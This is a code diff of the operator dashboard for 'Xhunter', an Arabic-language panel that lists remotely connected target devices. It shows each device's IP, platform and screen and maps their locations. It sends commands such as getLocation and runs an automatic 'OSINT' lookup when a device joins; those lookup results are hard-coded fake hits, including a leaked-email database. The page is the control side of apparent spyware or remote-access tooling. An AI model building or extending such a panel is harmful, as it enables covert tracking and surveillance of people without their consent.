@@ -12,7 +12,6 @@
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
 
 <style>
-/* --- إعدادات عامة --- */
 body { margin:0; font-family: Arial, sans-serif; background:#071021; color:#bfffe8; }
 .container { display:flex; min-height:100vh; }
 header { display:flex; justify-content:space-between; align-items:center; background:#001219; padding:15px 20px; box-shadow:0 2px 5px #000; }
@@ -22,10 +21,10 @@ header span { color:#f3f3f3; }
 .user-avatar i { font-size:24px; color:#00ffcc; }
 .connection-status { font-size:14px; }
 
-.sidebar { width:250px; background:#002233; padding:15px; }
+.sidebar { width:260px; background:#002233; padding:15px; }
 .sidebar-menu { list-style:none; padding:0; margin:0; }
 .sidebar-menu li { margin-bottom:10px; }
-.sidebar-menu li a { color:#bfffe8; text-decoration:none; display:flex; align-items:center; gap:10px; padding:8px; border-radius:5px; }
+.sidebar-menu li a { color:#bfffe8; text-decoration:none; display:flex; align-items:center; gap:10px; padding:10px; border-radius:5px; }
 .sidebar-menu li a.active, .sidebar-menu li a:hover { background:#00ffcc; color:#001219; }
 
 .main-content { flex:1; padding:20px; overflow:auto; }
@@ -33,11 +32,12 @@ header span { color:#f3f3f3; }
 .panel.active { display:block; }
 
 /* --- الأجهزة --- */
-.device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:10px; margin-top:15px; }
-.device-card { background:#001f2d; padding:10px; border-radius:8px; box-shadow:0 2px 5px #000; }
+.device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:10px; margin-top:15px; }
+.device-card { background:#001f2d; padding:12px; border-radius:8px; box-shadow:0 2px 5px #000; }
 .device-card h3 { margin:0 0 5px 0; font-size:18px; }
-.device-card pre { background:#002233; padding:5px; border-radius:5px; overflow:auto; max-height:150px; }
-.device-card button { margin:3px 3px 3px 0; padding:5px 8px; border:none; border-radius:5px; background:#00ffcc; color:#001219; cursor:pointer; font-weight:bold; }
+.device-card pre { background:#002233; padding:5px; border-radius:5px; overflow:auto; max-height:160px; }
+.device-card .device-info { margin-bottom:5px; }
+.device-card button { margin:3px 3px 3px 0; padding:6px 10px; border:none; border-radius:5px; background:#00ffcc; color:#001219; cursor:pointer; font-weight:bold; }
 
 /* --- إحصائيات --- */
 .stats-cards { display:flex; gap:10px; flex-wrap:wrap; margin-top:10px; }
@@ -45,11 +45,11 @@ header span { color:#f3f3f3; }
 .stat-card h3 { margin:0; font-size:20px; }
 
 /* --- الخريطة --- */
-#map { height:400px; width:100%; border:2px solid #00ffcc; border-radius:8px; margin-top:10px; }
+#map { height:450px; width:100%; border:2px solid #00ffcc; border-radius:8px; margin-top:10px; }
 
 /* --- OSINT --- */
 #osintResults { margin-top:10px; }
-.osint-entry { background:#001f2d; padding:8px; border-radius:6px; margin-bottom:8px; box-shadow:0 1px 3px #000; }
+.osint-entry { background:#001f2d; padding:10px; border-radius:6px; margin-bottom:8px; box-shadow:0 1px 3px #000; }
 
 /* --- أزرار OSINT --- */
 button#osintAutoBtn { background:#ffbb33; color:#001219; font-weight:bold; padding:8px 12px; border:none; border-radius:5px; cursor:pointer; }
@@ -72,7 +72,6 @@ button#osintAutoBtn { background:#ffbb33; color:#001219; font-weight:bold; paddi
 
 <div class="main-content">
 
-<!-- الهيدر -->
 <header>
 <div class="logo"><h1>نظام <span>Xhunter المتطور</span></h1></div>
 <div class="user-info">
@@ -112,7 +111,6 @@ button#osintAutoBtn { background:#ffbb33; color:#001219; font-weight:bold; paddi
 </div>
 </div>
 
-<!-- مكتبات -->
 <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
 <script src="https://cdn.socket.io/4.7.1/socket.io.min.js"></script>
 
@@ -133,12 +131,17 @@ socket.on('disconnect',()=>document.getElementById('connectionStatus').innerHTML
 
 function addLog(msg){const d=document.createElement('div'); d.textContent='['+new Date().toLocaleTimeString()+'] '+msg; logsDiv.appendChild(d); logsDiv.scrollTop=logsDiv.scrollHeight;}
 
-// --- عرض الأجهزة ---
+// --- عرض الأجهزة كاملة ---
 function renderDevice(device){
   let div=document.getElementById('device_'+device.id);
   if(!div){
     div=document.createElement('div'); div.id='device_'+device.id; div.className='device-card';
     div.innerHTML=`<h3>${device.model||device.id}</h3>
+    <div class="device-info">ID: ${device.id}</div>
+    <div class="device-info">IP: ${device.ip||'N/A'}</div>
+    <div class="device-info">Platform: ${device.platform||'N/A'}</div>
+    <div class="device-info">Language: ${device.language||'N/A'}</div>
+    <div class="device-info">Screen: ${device.screen?device.screen.width+'x'+device.screen.height:'N/A'}</div>
     <pre id="data_${device.id}">جارٍ تحديث البيانات...</pre>
     <div>
       <button onclick="sendCommand('${device.id}','getLocation')">الموقع</button>
@@ -153,7 +156,7 @@ function renderDevice(device){
   if(device.lastLocation){
     if(!map){map=L.map('map').setView([15.5,44],6);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'&copy; OpenStreetMap contributors'}).addTo(map);}
     if(markers[device.id]) markers[device.id].setLatLng([device.lastLocation.lat,device.lastLocation.lon]);
-    else markers[device.id]=L.marker([device.lastLocation.lat,device.lastLocation.lon]).addTo(map).bindPopup(`<b>${device.model}</b>`);
+    else markers[device.id]=L.marker([device.lastLocation.lat,device.lastLocation.lon]).addTo(map).bindPopup(`<b>${device.model}</b><br>${device.ip}<br>${device.lastLocation.address||''}`);
   }
 }
 
@@ -161,7 +164,7 @@ function renderDevice(device){
 function sendCommand(to,action){socket.emit('request',{to,action}); addLog(`أرسل الأمر: ${action} → ${to}`);}
 
 // استقبال الأجهزة الجديدة
-socket.on('join',device=>{renderDevice(device); addLog(`جهاز متصل: ${device.id}`);});
+socket.on('join',device=>{renderDevice(device); addLog(`جهاز متصل: ${device.id}`); runOSINT(device.id);});
 
 // استقبال نتائج الأوامر
 socket.on('requestResult',payload=>{
@@ -174,26 +177,28 @@ socket.on('requestResult',payload=>{
 });
 
 // OSINT تلقائي
-function runOSINT(){
-  osintResults.innerHTML='<div>جارٍ جمع المعلومات...</div>';
+function runOSINT(deviceId){
+  const query=deviceId||'target';
+  osintResults.innerHTML='<div>جارٍ جمع المعلومات عن الجهاز '+query+'...</div>';
   setTimeout(()=>{
     const sources=[
-      {name:'Google',result:'تم العثور على 3 روابط محتملة'},
-      {name:'LinkedIn',result:'ملف شخصي محتمل'},
-      {name:'Twitter',result:'حساب محتمل @target'},
-      {name:'EmailLeakDB',result:'تم العثور على بريد مسرب'}
+      {name:'Google',result:`تم العثور على 3 روابط محتملة عن ${query}`},
+      {name:'LinkedIn',result:`ملف شخصي محتمل`},
+      {name:'Twitter',result:`حساب محتمل @${query}`},
+      {name:'EmailLeakDB',result:`تم العثور على بريد مسرب مرتبط بـ ${query}`}
     ];
     osintResults.innerHTML='';
     sources.forEach(s=>{
       const div=document.createElement('div'); div.className='osint-entry';
-      div.innerHTML=`<b>${s.name}:</b> ${s.result}`; osintResults.appendChild(div);
+      div.innerHTML=`<b>${s.name}:</b> ${s.result}`;
+      osintResults.appendChild(div);
     });
-    addLog('OSINT تم جمع المعلومات تلقائيًا','success');
+    addLog('OSINT تم جمع المعلومات تلقائيًا عن '+query,'success');
   },1500);
 }
 
 // تشغيل OSINT عند الضغط
-document.getElementById('osintAutoBtn').addEventListener('click',runOSINT);
+document.getElementById('osintAutoBtn').addEventListener('click',()=>runOSINT());
 
 // تبويبات القائمة الجانبية
 document.querySelectorAll('.sidebar-menu a').forEach(link=>{
@@ -206,11 +211,6 @@ document.querySelectorAll('.sidebar-menu a').forEach(link=>{
     if(panel) panel.classList.add('active');
     if(link.dataset.tab==='map' && map){setTimeout(()=>map.invalidateSize(),100);}
   });
-});
-
-// --- OSINT تلقائي عند اتصال أي جهاز ---
-socket.on('join',device=>{
-  runOSINT();
 });
 </script>
 </body>
